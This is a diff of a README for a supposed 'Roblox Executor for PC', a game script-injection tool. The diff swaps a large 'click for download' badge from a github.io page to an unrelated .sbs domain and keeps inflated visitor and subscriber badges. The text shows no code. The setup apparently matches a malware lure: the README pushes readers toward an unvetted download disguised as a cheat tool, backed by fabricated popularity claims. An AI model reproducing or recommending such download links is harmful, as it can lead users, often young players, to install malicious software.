@@ -6,13 +6,17 @@
 This **Roblox Executor for PC** is a lightweight and functional Lua script assistant. It allows you to load, attach, and execute scripts with a user-friendly interface and robust error handling — ideal for modding, automation, and local testing.
 ---
 
-<div style="text-align: center">
-  <a href="https://steal-a-brainrot-all-characters.github.io/.github/">
-    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-all characters unlock-blueviolet">
-  </a>
-</div>
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
+
+
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
 
 ---
